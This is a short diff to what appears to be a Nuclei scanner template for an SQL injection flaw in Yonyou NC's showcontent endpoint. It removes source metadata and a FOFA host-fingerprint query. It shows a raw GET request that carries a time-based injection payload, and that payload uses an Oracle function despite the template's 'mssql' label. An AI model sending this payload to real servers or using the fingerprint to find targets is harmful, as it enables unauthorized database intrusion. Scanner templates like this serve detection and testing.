@@ -3,12 +3,8 @@ info:
   name: 用友 NC showcontent SQL注入漏洞-mssql
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zlumiqcbrh9oskg4'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zlumiqcbrh9oskg4
-    fofa: icon_hash="1085941792"
 http:
 - raw:
   - 'GET /ebvp/infopub/showcontent?id=1''+AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,5)-- HTTP/1.1
